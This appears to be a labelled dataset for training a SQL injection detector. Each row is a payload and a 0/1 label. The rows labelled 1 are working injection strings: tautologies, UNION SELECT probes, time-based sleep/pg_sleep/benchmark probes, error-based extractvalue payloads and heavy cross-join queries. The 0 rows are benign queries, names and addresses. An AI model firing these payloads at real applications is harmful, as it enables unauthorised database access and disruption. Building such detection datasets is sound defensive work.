payload	label
admin' or '	1
SELECT * FROM corn WHERE attempt BETWEEN 'catch' AND 'object'	0
1'  )   where 8291  =  8291	1
SELECT * FROM  ( SELECT life FROM paid ) 	0
querbico	0
moua	0
edmunds.emil@carimartin.io	0
olite	0
SELECT COUNT ( distantID ) FROM born	0
  SELECT are AS face, stretch AS [steel]  FROM too	0
SELECT * FROM guess WHERE reach BETWEEN '1996-07-01' AND '1996-07-31'	0
"1"" rlike sleep  (  5  )   and ""rylv"" like ""rylv"	1
1'  )   as gxfu where 9676  =  9676	1
1  )   rlike sleep  (  5  )   and   (  5724  =  5724	1
cancio	0
1  )   where 9829  =  9829 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
SELECT connected ( s ) FROM complex INNER JOIN	0
"1""   )    )    as eglv where 7412  =  7412 union all select null#"	1
-9103' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'nlvq'  =  'nlvq	1
   SELECT CustomerName, ContactName, AddressFROM CustomersWHERE Address   IS NOT NULL;	0
SELECT * FROM powerful WHERE    NOT distant = 'observe'	0
 UPDATE course SET manner = 'above'WHERE force = 'turn'	0
SELECT AVG ( east )  FROM smell  SELECT SUM ( string ) 	0
SELECT TOP 3 * FROM within SELECT * FROM soil 3SELECT * FROM white	0
1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
1' in boolean mode  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #	1
candelario	0
blascosancho	0
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_timeout_wp_wps_bg_image_sync_1_process_lock' LIMIT 1	0
SELECT * FROM with ORDER BY science	0
  UPDATE do SET action =  'come', City =  'thought' WHERE grandmother =  plain	0
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) 	1
darbanville@chicasdiabolo.tr	0
SELECT AVG ( consonant ) FROM music SELECT SUM ( dinner ) 	0
SELECT area ( s )  FROM seems UNION ALL	0
6390	0
SELECT DISTINCT baby FROM tin	0
1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'owot'  =  'owot	1
cooksey	0
arco del meson, 47,	0
44338	0
lareo robles	0
1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
7608	0
1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  7984  =  7984	1
SELECT * FROM evidence WHERE then NOT LIKE 'memory%'	0
INSERT INTO chief  ( horse, family, needed )  VALUES  ( 'hall', 'outer', 'master' )  	0
"1""   )    )    as qrrx where 4633  =  4633 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
   SELECT Employees.swam, COUNT ( Orders.combineID )  AS laterFROM    ( OrdersINNER JOIN move ON Orders.buriedID  =  Employees.askID ) 	0
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM taste	0
54430634f	0
1' where 1770  =  1770	1
almoharn	0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_facebook_url' LIMIT 1	0
SELECT * FROM door WHERE    NOT pleasant = 'local'	0
angeliek	0
1'||  (  select 'zdfo' from dual where 4288  =  4288 union all select null,null,null,null,null,null,null--	1
1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #	1
1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --	1
"1""  )   where 4964  =  4964"	1
  SELECT * FROM research WHERE till NOT IN  ( 'production', 'winter', 'burst' )  	0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_3_text' LIMIT 1	0
"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""hkjm"" like ""hkjm"	1
  SELECT * FROM gun WHERE slave NOT IN  ( 'army', 'line', 'ground' )  	0
quebrador	0
"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #"	1
SELECT * FROM unit WHERE Price NOT BETWEEN 10 AND 20	0
62	0
"  SELECT YEAR ( ""2017-06-15"" ) ;"	0
"1""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""sjiz"" like ""sjiz"	1
SELECT * FROM pile WHERE idea NOT LIKE 'most%'	0
34844	0
1 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
ivonne	0
SELECT * FROM truth FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM hall	0
-4972'   )    )    as kfzc where 8817  =  8817 union all select 8817,8817,8817,8817,8817,8817--	1
  SELECT * FROM across WHERE desk NOT IN  ( 'window', 'laid', 'eat' )  	0
1'   )    )    union all select null,null,null,null,null,null,null,null--	1
garek	0
1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  	1
SELECT * FROM dinner WHERE layers = 'ranch'  AND  ( stage = 'suit' OR useful = 'heart' ) 	0
"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
co*marca	0
SELECT Count ( * )  AS partly	0
"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--"	1
DELETE FROM hot	0
marcano giner	0
rom.val@rpdkorea.eg	0
select   (  case when   (  3676  =  8635  )   then 3676 else 1/  (  select 0  )   end  )  --	1
SELECT * FROM rod  WHERE appearance = conversation	0
-5470'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'oeam'  =  'oeam	1
 SELECT * FROM frozen ORDER BY over, former	0
SELECT * FROM vapor WHERE flat = 'review'  AND City = 'branch'	0
dao	0
1'+  (  select 'mtpt' where 7483  =  7483 union all select null,null,null,null,null,null,null,null,null--	1
SELECT * FROM report WHERE machinery = 'entirely'  AND  ( average = 'spend' OR bar = 'tight' ) 	0
SELECT AVG ( temperature ) FROM available SELECT SUM ( stretch ) 	0
1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'blnh' like 'blnh	1
1'||  (  select 'rhcv' where 6228  =  6228	1
guhl.monks@goscan.za	0
SELECT slide ( s )  FROM would UNION	0
   SELECT listen,income,neck,warn,quietly     (  (  spirit JOIN girl ON jar.dress =  burst.sound )   INNER JOIN stomachON Orders.solid =  voyage.pastID ) 	0
54310177r	0
1   )    )    as oqui where 3368  =  3368 order by 1--	1
" select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1"	1
distar	0
"1""  )   where 9962  =  9962 and 4595  =  4595#"	1
SELECT * FROM living	0
1  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --	1
1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	1
quicena	0
 SELECT * FROM sets ORDER BY torn ASC, cat DESC	0
1' union all select null#	1
baxie	0
1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'esal'  =  'esal	1
1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #	1
"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""usht"" like ""usht"	1
SELECT TOP 50 PERCENT * FROM obtain SELECT * FROM section FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM basket	0
SELECT * FROM with WHERE loose = 'have' FETCH FIRST 3 ROWS ONLY	0
  SELECT think,charge,hope FROM run LEFT JOIN Orders ON wave.generalID =  taste.lack ORDER BY include.enter	0
DELETE FROM string	0
SELECT MIN ( prepare )  AS accurate FROM negative	0
1%'  )   union all select null,null,null,null,null,null,null#	1
SELECT hidden ( s FROM kill RIGHT JOIN	0
INSERT INTO sudden ( anybody, turn, faster, replace, tune, rose )  VALUES  ( 'coast', 'seven'. wear', 'basket', 'gave', 'count', 'worry' )  	0
SELECT fairly ( s )  FROM creature FULL OUTER JOIN	0
SELECT * FROM welcome	0
duesaiges	0
SELECT * FROM them WHERE silly NOT BETWEEN 'dozen' AND 'bottom'	0
humaina	0
FROM  ( SELECT DISTINCT scared FROM respect ) 	0
SELECT balloon ( s )  FROM correctly	0
 select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'	1
-7072'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) 	1
calle jose lopez tafall 192	0
SELECT * FROM fast WHERE tribe BETWEEN '1996-07-01' AND '1996-07-31'	0
savitsky@tetdevelocidad.sj	0
SELECT * FROM system WHERE she = 'meet' LIMIT 3	0
  SELECT belong,alone,anybody FROM same LEFT JOIN Orders ON successful.progressID =  return.weak ORDER BY tales.college	0
gribov-ridgeley@creacionwebs.lk	0
1'+  (  select ummn where 8883  =  8883 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'	1
simeon	0
SELECT matter FROM frog UNION SELECT cheese FROM length ORDER BY environment	0
" select * from users where id  =  1 or "";&"" or 1  =  1 -- 1"	1
-5496 union all select 2099,2099,2099#	1
SELECT * FROM excellent FETCH FIRST 3 ROWS ONLY	0
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1"	1
zenaires	0
-7600' or 7684  =  3181#	1
15819331t	0
INSERT INTO baseball ( wrote, shall, your, half, rabbit, party )  VALUES  ( 'meal', 'ranch'. dead', 'engineer', 'steep', 'unusual', 'service' )  	0
"-1816""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dztr"" like ""dztr"	1
34491	0
SELECT * FROM came WHERE already NOT LIKE '[matter]%'	0
select   (  case when   (  4341  =  7041  )   then 4341 else 4341*  (  select 4341 from mysql.db  )   end  )  #	1
masters-mcnear@costablancarental.ax	0
SELECT * FROM made WHERE connected NOT BETWEEN 'aboard' AND 'aware'	0
camisoln	0
1440000000000000	0
1 where 6223  =  6223 rlike sleep  (  5  )  #	1
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 29420 )  ORDER BY meta_id ASC	0
1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #	1
SELECT * FROM pair WHERE your = 'corn' FETCH FIRST 3 ROWS ONLY	0
1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   	1
pasaje pedrosa 115, 6f	0
INSERT INTO blood ( meal, each, term, mental, heard, smaller )  VALUES  ( 'her', 'help'. pure', 'develop', 'tell', 'bone', 'constantly' )  	0
9110	0
 UPDATE good SET trouble = 'relationship'WHERE electricity = 'excellent'	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28450 )  ORDER BY meta_id ASC	0
SELECT west FROM dinner UNION SELECT task FROM jar ORDER BY wheel	0
"1%""   )    )    union all select null,null,null,null--"	1
  SELECT apple AS present, think AS [fifth]  FROM at	0
  SELECT tightID AS ID, bar AS easier FROM consist	0
select   (  case when   (  8403  =  7151  )   then 8403 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
SELECT * FROM symbol WHERE audience  BETWEEN 10 AND 20	0
"1%""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """	1
SELECT grabbed ( s )  FROM moon	0
SELECT COUNT ( symbol ) FROM planned	0
SELECT AVG ( either ) FROM result SELECT SUM ( slipped ) 	0
select   (  case when   (  4624  =  4844  )   then 4624 else 1/  (  select 0  )   end  )  --	1
57727237c	0
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1"	1
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""dksc""  =  ""dksc"	1
tice	0
buchel-alymer@gemas.org.bu	0
elias pallares	0
1%'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '	1
   SELECT hello, prove+ ', ' + listen+ ' ' + complete+ ', ' + calm AS consider  FROM bare	0
"  SELECT DAY ( ""2017-06-15"" ) ;"	0
SELECT * FROM hide WHERE    NOT animal = 'outside'	0
  SELECT Orders.nearlyrID, Employees.suppose, Employees.balance FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.provideID ORDER BY Orders.tapeID	0
DELETE FROM grown	0
al769i4	0
-9809' order by 1--	1
-6039%'   )    )    or 6872  =  6872 and    (    (   '%'  =  '	1
SELECT * FROM by WHERE    NOT giant = 'school'	0
SELECT * FROM receive WHERE Price NOT BETWEEN 10 AND 20	0
SELECT AVG ( cause ) FROM weather SELECT SUM ( dig ) 	0
carceln	0
SELECT TOP 3 * FROM owner WHERE business = 'lunch'	0
fergus	0
"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""giuq""  =  ""giuq"	1
chinarro	0
-2174'   )    )    as zhoz where 4185  =  4185 order by 1#	1
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep"	1
SELECT agree FROM sink UNION SELECT brown FROM ill ORDER BY describe	0
-8667'+  (  select ymmg where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132#	1
"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
  SELECT saddleID AS ID, shelter AS shade FROM order	0
SELECT City FROM Customers UNION ALL	0
27113	0
   SELECT COUNT ( completely ) , hole FROM experiment BY graph	0
"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """	1
1 where 1776  =  1776 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '	1
SELECT DISTINCT missing FROM son	0
5arneci052	0
SELECT AVG ( raise )  FROM declared  SELECT SUM ( tongue ) 	0
   SELECT willing, mice, intoFROM hurry WHERE pick  IS NOT NULL	0
   SELECT ants, farther, opposite FROM lack WHERE college  IS NULL	0
ozselcuk	0
1'||  (  select 'uvbb' where 7795  =  7795 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'	1
  SELECT twentyID AS ID, me AS excited FROM wife	0
DELETE FROM send	0
SELECT * FROM newspaper FETCH FIRST 50 PERCENT ROWS ONLY	0
-7552 or 6872  =  6872	1
end and   (  'rlux' like 'rlux	1
cartaya	0
  SELECT leaf,did FROM leave WHERE creature = 'whole' UNION SELECT nor, before FROM written	0
-4045 union all select 6857,6857,6857,6857,6857,6857,6857--	1
SELECT * FROM born FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT lion ( s )  FROM list UNION	0
SELECT * FROM branch WHERE result = 'window' FETCH FIRST 3 ROWS ONLY	0
  SELECT Orders.futurerID, Employees.height, Employees.blow FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.tryID ORDER BY Orders.olderID	0
  SELECT massage,built,enemy FROM order LEFT JOIN Orders ON immediately.religiousID =  paragraph.although ORDER BY bee.desert	0
FROM  ( SELECT DISTINCT stranger FROM managed ) 	0
SELECT TOP 3 * FROM brief WHERE monkey = 'changing'	0
SELECT DISTINCT nobody FROM nice	0
SELECT * FROM piece WHERE twelve = 'ship'  AND City = 'excellent'	0
cazallas caminal	0
SELECT month ( s )  FROM on SELECT electricity ( s ) 	0
1%'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '	1
gilda6@mytanga.om	0
15142	0
SELECT Count ( * )  AS paragraph	0
SELECT reader	0
-5534 or 1983  =  5721#	1
SELECT fought ( s )  FROM planned	0
SELECT COUNT ( design )  FROM begun	0
45738	0
SELECT TOP 3 * FROM swing WHERE crew = 'feed'	0
SELECT AVG ( provide ) FROM opposite	0
bolvir	0
19243	0
"SELECT STRCMP ( ""SQL Tutorial"",   ""SQL Tutorial"" ) ;"	0
INSERT INTO stay  ( pond, desk, addition )  VALUES  ( 'lunch', 'completely', 'active' )  	0
55585768n	0
elt  (  8192  =  8192,sleep  (  5   )    )   	1
  SELECT fruitID AS ID, aware AS select FROM society	0
moriego	0
33418	0
1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '	1
-5597'  )   or make_set  (  2490  =  2164,2164  )  	1
alide	0
SELECT * FROM have WHERE unless BETWEEN '1996-07-01' AND '1996-07-31'	0
